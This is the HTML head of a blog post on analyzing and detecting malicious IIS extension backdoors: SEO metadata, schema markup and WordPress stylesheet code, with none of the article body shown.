<!DOCTYPE html>
<html dir="ltr" lang="en-US" prefix="og: https://ogp.me/ns#">
<head><meta charset="UTF-8">
	
	<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- All in One SEO 4.9.3 - aioseo.com -->
	<meta name="description" content="IIS Extensions As Backdoors Microsoft recently published an interesting blog explaining how they've noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers: https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/ The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order">
	<meta name="robots" content="max-image-preview:large">
	<meta name="author" content="robwillisinfo">
	<meta name="keywords" content="detection,extensions,iis,kali,logs,powershell,security,siem,sysmon,web shell,windows">
	<link rel="canonical" href="/2022/11/analyzing-detecting-iis-backdoors/">
	<meta name="generator" content="All in One SEO (AIOSEO) 4.9.3">
		<meta property="og:locale" content="en_US">
		<meta property="og:site_name" content="RobWillis.info | #yolosec">
		<meta property="og:type" content="article">
		<meta property="og:title" content="Analyzing &amp; Detecting IIS Backdoors | RobWillis.info">
		<meta property="og:description" content="IIS Extensions As Backdoors Microsoft recently published an interesting blog explaining how they've noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers: https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/ The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order">
		<meta property="og:url" content="/2022/11/analyzing-detecting-iis-backdoors/">
		<meta property="article:published_time" content="2022-11-05T08:00:12+00:00">
		<meta property="article:modified_time" content="2022-11-06T09:23:08+00:00">
		<meta name="twitter:card" content="summary">
		<meta name="twitter:title" content="Analyzing &amp; Detecting IIS Backdoors | RobWillis.info">
		<meta name="twitter:description" content="IIS Extensions As Backdoors Microsoft recently published an interesting blog explaining how they've noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers: https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/ The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order">
		<script type="application/ld+json" class="aioseo-schema">
			{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#article","name":"Analyzing & Detecting IIS Backdoors | RobWillis.info","headline":"Analyzing & Detecting IIS Backdoors","author":{"@id":"\/author\/bit_rot\/#author"},"publisher":{"@id":"\/#organization"},"image":{"@type":"ImageObject","url":"\/wp-content\/uploads\/2022\/10\/IIS-Raid-Feat.png","width":950,"height":441},"datePublished":"2022-11-05T03:00:12-05:00","dateModified":"2022-11-06T03:23:08-06:00","inLanguage":"en-US","mainEntityOfPage":{"@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#webpage"},"isPartOf":{"@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#webpage"},"articleSection":"Blog, Computers, Pen Testing, Security, Servers, Tools, Detection, Extensions, IIS, Kali, Logs, Powershell, security, SIEM, Sysmon, Web Shell, Windows"},{"@type":"BreadcrumbList","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"#listItem","position":1,"name":"Home","item":"","nextItem":{"@type":"ListItem","@id":"\/category\/computers\/#listItem","name":"Computers"}},{"@type":"ListItem","@id":"\/category\/computers\/#listItem","position":2,"name":"Computers","item":"\/category\/computers\/","nextItem":{"@type":"ListItem","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#listItem","name":"Analyzing & Detecting IIS Backdoors"},"previousItem":{"@type":"ListItem","@id":"#listItem","name":"Home"}},{"@type":"ListItem","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#listItem","position":3,"name":"Analyzing & Detecting IIS Backdoors","previousItem":{"@type":"ListItem","@id":"\/category\/computers\/#listItem","name":"Computers"}}]},{"@type":"Organization","@id":"\/#organization","name":"RobWillis.info","description":"#yolosec","url":"\/"},{"@type":"Person","@id":"\/author\/bit_rot\/#author","url":"\/author\/bit_rot\/","name":"robwillisinfo","image":{"@type":"ImageObject","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#authorImage","url":"https:\/\/secure.gravatar.com\/avatar\/5abe3ae45b388410a815ca1c5ff124c1e418cd7b13ef7401ce6393d362cd1c90?s=96&d=mm&r=r","width":96,"height":96,"caption":"robwillisinfo"}},{"@type":"WebPage","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#webpage","url":"\/2022\/11\/analyzing-detecting-iis-backdoors\/","name":"Analyzing & Detecting IIS Backdoors | RobWillis.info","description":"IIS Extensions As Backdoors Microsoft recently published an interesting blog explaining how they've noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers: https:\/\/www.microsoft.com\/security\/blog\/2022\/07\/26\/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers\/ The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order","inLanguage":"en-US","isPartOf":{"@id":"\/#website"},"breadcrumb":{"@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#breadcrumblist"},"author":{"@id":"\/author\/bit_rot\/#author"},"creator":{"@id":"\/author\/bit_rot\/#author"},"image":{"@type":"ImageObject","url":"\/wp-content\/uploads\/2022\/10\/IIS-Raid-Feat.png","@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#mainImage","width":950,"height":441},"primaryImageOfPage":{"@id":"\/2022\/11\/analyzing-detecting-iis-backdoors\/#mainImage"},"datePublished":"2022-11-05T03:00:12-05:00","dateModified":"2022-11-06T03:23:08-06:00"},{"@type":"WebSite","@id":"\/#website","url":"\/","name":"RobWillis.info","description":"#yolosec","inLanguage":"en-US","publisher":{"@id":"\/#organization"}}]}
		</script>
		<!-- All in One SEO -->

<title>Analyzing &amp; Detecting IIS Backdoors | RobWillis.info</title>
<link rel="alternate" type="application/rss+xml" title="RobWillis.info » Feed" href="/feed/">
<link rel="alternate" type="application/rss+xml" title="RobWillis.info » Comments Feed" href="/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="RobWillis.info » Analyzing &amp; Detecting IIS Backdoors Comments Feed" href="/2022/11/analyzing-detecting-iis-backdoors/feed/">
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2F2022%2F11%2Fanalyzing-detecting-iis-backdoors%2F">
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2F2022%2F11%2Fanalyzing-detecting-iis-backdoors%2F&amp;format=xml">
<style id="wp-img-auto-sizes-contain-inline-css">
img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
</style>
<style id="wp-block-site-title-inline-css">
.wp-block-site-title{box-sizing:border-box}.wp-block-site-title :where(a){color:inherit;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-decoration:inherit}
/*# sourceURL=/wp-includes/blocks/site-title/style.min.css */
</style>
<style id="wp-block-navigation-link-inline-css">
.wp-block-navigation .wp-block-navigation-item__label{overflow-wrap:break-word}.wp-block-navigation .wp-block-navigation-item__description{display:none}.link-ui-tools{outline:1px solid #f0f0f0;padding:8px}.link-ui-block-inserter{padding-top:8px}.link-ui-block-inserter__back{margin-left:8px;text-transform:uppercase}
/*# sourceURL=/wp-includes/blocks/navigation-link/style.min.css */
</style>
<style id="wp-block-navigation-inline-css">
.wp-block-navigation{position:relative}.wp-block-navigation ul{margin-bottom:0;margin-left:0;margin-top:0;padding-left:0}.wp-block-navigation ul,.wp-block-navigation ul li{list-style:none;padding:0}.wp-block-navigation .wp-block-navigation-item{align-items:center;background-color:inherit;display:flex;position:relative}.wp-block-navigation .wp-block-navigation-item .wp-block-navigation__submenu-container:empty{display:none}.wp-block-navigation .wp-block-navigation-item__content{display:block;z-index:1}.wp-block-navigation .wp-block-navigation-item__content.wp-block-navigation-item__content{color:inherit}.wp-block-navigation.has-text-decoration-underline .wp-block-navigation-item__content,.wp-block-navigation.has-text-decoration-underline .wp-block-navigation-item__content:active,.wp-block-navigation.has-text-decoration-underline .wp-block-navigation-item__content:focus{text-decoration:underline}.wp-block-navigation.has-text-decoration-line-through .wp-block-navigation-item__content,.wp-block-navigation.has-text-decoration-line-through .wp-block-navigation-item__content:active,.wp-block-navigation.has-text-decoration-line-through .wp-block-navigation-item__content:focus{text-decoration:line-through}.wp-block-navigation :where(a),.wp-block-navigation :where(a:active),.wp-block-navigation :where(a:focus){text-decoration:none}.wp-block-navigation .wp-block-navigation__submenu-icon{align-self:center;background-color:inherit;border:none;color:currentColor;display:inline-block;font-size:inherit;height:.6em;line-height:0;margin-left:.25em;padding:0;width:.6em}.wp-block-navigation .wp-block-navigation__submenu-icon svg{display:inline-block;stroke:currentColor;height:inherit;margin-top:.075em;width:inherit}.wp-block-navigation{--navigation-layout-justification-setting:flex-start;--navigation-layout-direction:row;--navigation-layout-wrap:wrap;--navigation-layout-justify:flex-start;--navigation-layout-align:center}.wp-block-navigation.is-vertical{--navigation-layout-direction:column;--navigation-layout-justify:initial;--navigation-layout-align:flex-start}.wp-block-navigation.no-wrap{--navigation-layout-wrap:nowrap}.wp-block-navigation.items-justified-center{--navigation-layout-justification-setting:center;--navigation-layout-justify:center}.wp-block-navigation.items-justified-center.is-vertical{--navigation-layout-align:center}.wp-block-navigation.items-justified-right{--navigation-layout-justification-setting:flex-end;--navigation-layout-justify:flex-end}.wp-block-navigation.items-justified-right.is-vertical{--navigation-layout-align:flex-end}.wp-block-navigation.items-justified-space-between{--navigation-layout-justification-setting:space-between;--navigation-layout-justify:space-between}.wp-block-navigation .has-child .wp-block-navigation__submenu-container{align-items:normal;background-color:inherit;color:inherit;display:flex;flex-direction:column;opacity:0;position:absolute;z-index:2}@media not (prefers-reduced-motion){.wp-block-navigation .has-child .wp-block-navigation__submenu-container{transition:opacity .1s linear}}.wp-block-navigation .has-child .wp-block-navigation__submenu-container{height:0;overflow:hidden;visibility:hidden;width:0}.wp-block-navigation .has-child .wp-block-navigation__submenu-container>.wp-block-navigation-item>.wp-block-navigation-item__content{display:flex;flex-grow:1;padding:.5em 1em}.wp-block-navigation .has-child .wp-block-navigation__submenu-container>.wp-block-navigation-item>.wp-block-navigation-item__content .wp-block-navigation__submenu-icon{margin-left:auto;margin-right:0}.wp-block-navigation .has-child .wp-block-navigation__submenu-container .wp-block-navigation-item__content{margin:0}.wp-block-navigation .has-child .wp-block-navigation__submenu-container{left:-1px;top:100%}@media (min-width:782px){.wp-block-navigation .has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container{left:100%;top:-1px}.wp-block-navigation .has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container:before{background:#0000;content:"";display:block;height:100%;position:absolute;right:100%;width:.5em}.wp-block-navigation .has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-icon{margin-right:.25em}.wp-block-navigation .has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-icon svg{transform:rotate(-90deg)}}.wp-block-navigation .has-child .wp-block-navigation-submenu__toggle[aria-expanded=true]~.wp-block-navigation__submenu-container,.wp-block-navigation .has-child:not(.open-on-click):hover>.wp-block-navigation__submenu-container,.wp-block-navigation .has-child:not(.open-on-click):not(.open-on-hover-click):focus-within>.wp-block-navigation__submenu-container{height:auto;min-width:200px;opacity:1;overflow:visible;visibility:visible;width:auto}.wp-block-navigation.has-background .has-child .wp-block-navigation__submenu-container{left:0;top:100%}@media (min-width:782px){.wp-block-navigation.has-background .has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container{left:100%;top:0}}.wp-block-navigation-submenu{display:flex;position:relative}.wp-block-navigation-submenu .wp-block-navigation__submenu-icon svg{stroke:currentColor}button.wp-block-navigation-item__content{background-color:initial;border:none;color:currentColor;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-align:left;text-transform:inherit}.wp-block-navigation-submenu__toggle{cursor:pointer}.wp-block-navigation-submenu__toggle[aria-expanded=true]+.wp-block-navigation__submenu-icon>svg,.wp-block-navigation-submenu__toggle[aria-expanded=true]>svg{transform:rotate(180deg)}.wp-block-navigation-item.open-on-click .wp-block-navigation-submenu__toggle{padding-left:0;padding-right:.85em}.wp-block-navigation-item.open-on-click .wp-block-navigation-submenu__toggle+.wp-block-navigation__submenu-icon{margin-left:-.6em;pointer-events:none}.wp-block-navigation-item.open-on-click button.wp-block-navigation-item__content:not(.wp-block-navigation-submenu__toggle){padding:0}.wp-block-navigation .wp-block-page-list,.wp-block-navigation__container,.wp-block-navigation__responsive-close,.wp-block-navigation__responsive-container,.wp-block-navigation__responsive-container-content,.wp-block-navigation__responsive-dialog{gap:inherit}:where(.wp-block-navigation.has-background .wp-block-navigation-item a:not(.wp-element-button)),:where(.wp-block-navigation.has-background .wp-block-navigation-submenu a:not(.wp-element-button)){padding:.5em 1em}:where(.wp-block-navigation .wp-block-navigation__submenu-container .wp-block-navigation-item a:not(.wp-element-button)),:where(.wp-block-navigation .wp-block-navigation__submenu-container .wp-block-navigation-submenu a:not(.wp-element-button)),:where(.wp-block-navigation .wp-block-navigation__submenu-container .wp-block-navigation-submenu button.wp-block-navigation-item__content),:where(.wp-block-navigation .wp-block-navigation__submenu-container .wp-block-pages-list__item button.wp-block-navigation-item__content){padding:.5em 1em}.wp-block-navigation.items-justified-right .wp-block-navigation__container .has-child .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-right .wp-block-page-list>.has-child .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-space-between .wp-block-page-list>.has-child:last-child .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-space-between>.wp-block-navigation__container>.has-child:last-child .wp-block-navigation__submenu-container{left:auto;right:0}.wp-block-navigation.items-justified-right .wp-block-navigation__container .has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-right .wp-block-page-list>.has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-space-between .wp-block-page-list>.has-child:last-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-space-between>.wp-block-navigation__container>.has-child:last-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container{left:-1px;right:-1px}@media (min-width:782px){.wp-block-navigation.items-justified-right .wp-block-navigation__container .has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-right .wp-block-page-list>.has-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-space-between .wp-block-page-list>.has-child:last-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container,.wp-block-navigation.items-justified-space-between>.wp-block-navigation__container>.has-child:last-child .wp-block-navigation__submenu-container .wp-block-navigation__submenu-container{left:auto;right:100%}}.wp-block-navigation:not(.has-background) .wp-block-navigation__submenu-container{background-color:#fff;border:1px solid #00000026}.wp-block-navigation.has-background .wp-block-navigation__submenu-container{background-color:inherit}.wp-block-navigation:not(.has-text-color) .wp-block-navigation__submenu-container{color:#000}.wp-block-navigation__container{align-items:var(--navigation-layout-align,initial);display:flex;flex-direction:var(--navigation-layout-direction,initial);flex-wrap:var(--navigation-layout-wrap,wrap);justify-content:var(--navigation-layout-justify,initial);list-style:none;margin:0;padding-left:0}.wp-block-navigation__container .is-responsive{display:none}.wp-block-navigation__container:only-child,.wp-block-page-list:only-child{flex-grow:1}@keyframes overlay-menu__fade-in-animation{0%{opacity:0;transform:translateY(.5em)}to{opacity:1;transform:translateY(0)}}.wp-block-navigation__responsive-container{bottom:0;display:none;left:0;position:fixed;right:0;top:0}.wp-block-navigation__responsive-container :where(.wp-block-navigation-item a){color:inherit}.wp-block-navigation__responsive-container .wp-block-navigation__responsive-container-content{align-items:var(--navigation-layout-align,initial);display:flex;flex-direction:var(--navigation-layout-direction,initial);flex-wrap:var(--navigation-layout-wrap,wrap);justify-content:var(--navigation-layout-justify,initial)}.wp-block-navigation__responsive-container:not(.is-menu-open.is-menu-open){background-color:inherit!important;color:inherit!important}.wp-block-navigation__responsive-container.is-menu-open{background-color:inherit;display:flex;flex-direction:column}@media not (prefers-reduced-motion){.wp-block-navigation__responsive-container.is-menu-open{animation:overlay-menu__fade-in-animation .1s ease-out;animation-fill-mode:forwards}}.wp-block-navigation__responsive-container.is-menu-open{overflow:auto;padding:clamp(1rem,var(--wp--style--root--padding-top),20rem) clamp(1rem,var(--wp--style--root--padding-right),20rem) clamp(1rem,var(--wp--style--root--padding-bottom),20rem) clamp(1rem,var(--wp--style--root--padding-left),20rem);z-index:100000}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content{align-items:var(--navigation-layout-justification-setting,inherit);display:flex;flex-direction:column;flex-wrap:nowrap;overflow:visible;padding-top:calc(2rem + 24px)}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content,.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-navigation__container,.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-page-list{justify-content:flex-start}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-navigation__submenu-icon{display:none}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .has-child .wp-block-navigation__submenu-container{border:none;height:auto;min-width:200px;opacity:1;overflow:initial;padding-left:2rem;padding-right:2rem;position:static;visibility:visible;width:auto}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-navigation__container,.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-navigation__submenu-container{gap:inherit}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-navigation__submenu-container{padding-top:var(--wp--style--block-gap,2em)}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-navigation-item__content{padding:0}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-navigation-item,.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-navigation__container,.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__responsive-container-content .wp-block-page-list{align-items:var(--navigation-layout-justification-setting,initial);display:flex;flex-direction:column}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation-item,.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation-item .wp-block-navigation__submenu-container,.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__container,.wp-block-navigation__responsive-container.is-menu-open .wp-block-page-list{background:#0000!important;color:inherit!important}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__submenu-container.wp-block-navigation__submenu-container.wp-block-navigation__submenu-container.wp-block-navigation__submenu-container{left:auto;right:auto}@media (min-width:600px){.wp-block-navigation__responsive-container:not(.hidden-by-default):not(.is-menu-open){background-color:inherit;display:block;position:relative;width:100%;z-index:auto}.wp-block-navigation__responsive-container:not(.hidden-by-default):not(.is-menu-open) .wp-block-navigation__responsive-container-close{display:none}.wp-block-navigation__responsive-container.is-menu-open .wp-block-navigation__submenu-container.wp-block-navigation__submenu-container.wp-block-navigation__submenu-container.wp-block-navigation__submenu-container{left:0}}.wp-block-navigation:not(.has-background) .wp-block-navigation__responsive-container.is-menu-open{background-color:#fff}.wp-block-navigation:not(.has-text-color) .wp-block-navigation__responsive-container.is-menu-open{color:#000}.wp-block-navigation__toggle_button_label{font-size:1rem;font-weight:700}.wp-block-navigation__responsive-container-close,.wp-block-navigation__responsive-container-open{background:#0000;border:none;color:currentColor;cursor:pointer;margin:0;padding:0;text-transform:inherit;vertical-align:middle}.wp-block-navigation__responsive-container-close svg,.wp-block-navigation__responsive-container-open svg{fill:currentColor;display:block;height:24px;pointer-events:none;width:24px}.wp-block-navigation__responsive-container-open{display:flex}.wp-block-navigation__responsive-container-open.wp-block-navigation__responsive-container-open.wp-block-navigation__responsive-container-open{font-family:inherit;font-size:inherit;font-weight:inherit}@media (min-width:600px){.wp-block-navigation__responsive-container-open:not(.always-shown){display:none}}.wp-block-navigation__responsive-container-close{position:absolute;right:0;top:0;z-index:2}.wp-block-navigation__responsive-container-close.wp-block-navigation__responsive-container-close.wp-block-navigation__responsive-container-close{font-family:inherit;font-size:inherit;font-weight:inherit}.wp-block-navigation__responsive-close{width:100%}.has-modal-open .wp-block-navigation__responsive-close{margin-left:auto;margin-right:auto;max-width:var(--wp--style--global--wide-size,100%)}.wp-block-navigation__responsive-close:focus{outline:none}.is-menu-open .wp-block-navigation__responsive-close,.is-menu-open .wp-block-navigation__responsive-container-content,.is-menu-open .wp-block-navigation__responsive-dialog{box-sizing:border-box}.wp-block-navigation__responsive-dialog{position:relative}.has-modal-open .admin-bar .is-menu-open .wp-block-navigation__responsive-dialog{margin-top:46px}@media (min-width:782px){.has-modal-open .admin-bar .is-menu-open .wp-block-navigation__responsive-dialog{margin-top:32px}}html.has-modal-open{overflow:hidden}
/*# sourceURL=/wp-includes/blocks/navigation/style.min.css */
</style>
<style id="wp-block-group-inline-css">
.wp-block-group{box-sizing:border-box}:where(.wp-block-group.wp-block-group-is-layout-constrained){position:relative}
/*# sourceURL=/wp-includes/blocks/group/style.min.css */
</style>
<style id="wp-block-post-title-inline-css">
.wp-block-post-title{box-sizing:border-box;word-break:break-word}.wp-block-post-title :where(a){display:inline-block;font-family:inherit;font-size:inherit;font-style:inherit;font-weight:inherit;letter-spacing:inherit;line-height:inherit;text-decoration:inherit}
/*# sourceURL=/wp-includes/blocks/post-title/style.min.css */
</style>
<style id="wp-block-paragraph-inline-css">
.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
/*# sourceURL=/wp-includes/blocks/paragraph/style.min.css */
</style>
<style id="wp-block-post-author-name-inline-css">
.wp-block-post-author-name{box-sizing:border-box}
/*# sourceURL=/wp-includes/blocks/post-author-name/style.min.css */
</style>
<style id="wp-block-post-terms-inline-css">
.wp-block-post-terms{box-sizing:border-box}.wp-block-post-terms .wp-block-post-terms__separator{white-space:pre-wrap}
/*# sourceURL=/wp-includes/blocks/post-terms/style.min.css */
</style>
<style id="wp-block-post-content-inline-css">
.wp-block-post-content{display:flow-root}
/*# sourceURL=/wp-includes/blocks/post-content/style.min.css */
</style>
<style id="wp-block-post-navigation-link-inline-css">
.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-previous{display:inline-block;margin-right:1ch}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-previous:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-next{display:inline-block;margin-left:1ch}.wp-block-post-navigation-link .wp-block-post-navigation-link__arrow-next:not(.is-arrow-chevron){transform:scaleX(1)}.wp-block-post-navigation-link.has-text-align-left[style*="writing-mode: vertical-lr"],.wp-block-post-navigation-link.has-text-align-right[style*="writing-mode: vertical-rl"]{rotate:180deg}
/*# sourceURL=/wp-includes/blocks/post-navigation-link/style.min.css */
</style>
<style id="wp-block-heading-inline-css">
h1:where(.wp-block-heading).has-background,h2:where(.wp-block-heading).has-background,h3:where(.wp-block-heading).has-background,h4:where(.wp-block-heading).has-background,h5:where(.wp-block-heading).has-background,h6:where(.wp-block-heading).has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}
/*# sourceURL=/wp-includes/blocks/heading/style.min.css */
</style>
<style id="wp-block-post-date-inline-css">
.wp-block-post-date{box-sizing:border-box}
/*# sourceURL=/wp-includes/blocks/post-date/style.min.css */
</style>
<style id="wp-block-post-template-inline-css">
.wp-block-post-template{box-sizing:border-box;list-style:none;margin-bottom:0;margin-top:0;max-width:100%;padding:0}.wp-block-post-template.is-flex-container{display:flex;flex-direction:row;flex-wrap:wrap;gap:1.25em}.wp-block-post-template.is-flex-container>li{margin:0;width:100%}@media (min-width:600px){.wp-block-post-template.is-flex-container.is-flex-container.columns-2>li{width:calc(50% - .625em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-3>li{width:calc(33.33333% - .83333em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-4>li{width:calc(25% - .9375em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-5>li{width:calc(20% - 1em)}.wp-block-post-template.is-flex-container.is-flex-container.columns-6>li{width:calc(16.66667% - 1.04167em)}}@media (max-width:600px){.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid.wp-block-post-template-is-layout-grid{grid-template-columns:1fr}}.wp-block-post-template-is-layout-constrained>li>.alignright,.wp-block-post-template-is-layout-flow>li>.alignright{float:right;margin-inline-end:0;margin-inline-start:2em}.wp-block-post-template-is-layout-constrained>li>.alignleft,.wp-block-post-template-is-layout-flow>li>.alignleft{float:left;margin-inline-end:2em;margin-inline-start:0}.wp-block-post-template-is-layout-constrained>li>.aligncenter,.wp-block-post-template-is-layout-flow>li>.aligncenter{margin-inline-end:auto;margin-inline-start:auto}
/*# sourceURL=/wp-includes/blocks/post-template/style.min.css */
</style>
<style id="wp-block-social-links-inline-css">
.wp-block-social-links{background:none;box-sizing:border-box;margin-left:0;padding-left:0;padding-right:0;text-indent:0}.wp-block-social-links .wp-social-link a,.wp-block-social-links .wp-social-link a:hover{border-bottom:0;box-shadow:none;text-decoration:none}.wp-block-social-links .wp-social-link svg{height:1em;width:1em}.wp-block-social-links .wp-social-link span:not(.screen-reader-text){font-size:.65em;margin-left:.5em;margin-right:.5em}.wp-block-social-links.has-small-icon-size{font-size:16px}.wp-block-social-links,.wp-block-social-links.has-normal-icon-size{font-size:24px}.wp-block-social-links.has-large-icon-size{font-size:36px}.wp-block-social-links.has-huge-icon-size{font-size:48px}.wp-block-social-links.aligncenter{display:flex;justify-content:center}.wp-block-social-links.alignright{justify-content:flex-end}.wp-block-social-link{border-radius:9999px;display:block}@media not (prefers-reduced-motion){.wp-block-social-link{transition:transform .1s ease}}.wp-block-social-link{height:auto}.wp-block-social-link a{align-items:center;display:flex;line-height:0}.wp-block-social-link:hover{transform:scale(1.1)}.wp-block-social-links .wp-block-social-link.wp-social-link{display:inline-block;margin:0;padding:0}.wp-block-social-links .wp-block-social-link.wp-social-link .wp-block-social-link-anchor,.wp-block-social-links .wp-block-social-link.wp-social-link .wp-block-social-link-anchor svg,.wp-block-social-links .wp-block-social-link.wp-social-link .wp-block-social-link-anchor:active,.wp-block-social-links .wp-block-social-link.wp-social-link .wp-block-social-link-anchor:hover,.wp-block-social-links .wp-block-social-link.wp-social-link .wp-block-social-link-anchor:visited{color:currentColor;fill:currentColor}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link{background-color:#f0f0f0;color:#444}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-amazon{background-color:#f90;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-bandcamp{background-color:#1ea0c3;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-behance{background-color:#0757fe;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-bluesky{background-color:#0a7aff;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-codepen{background-color:#1e1f26;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-deviantart{background-color:#02e49b;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-discord{background-color:#5865f2;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-dribbble{background-color:#e94c89;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-dropbox{background-color:#4280ff;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-etsy{background-color:#f45800;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) .wp-social-link-facebook{background-color:#0866ff;color:#fff}:where(.wp-block-social-links:not(.is-style-logos-only)) 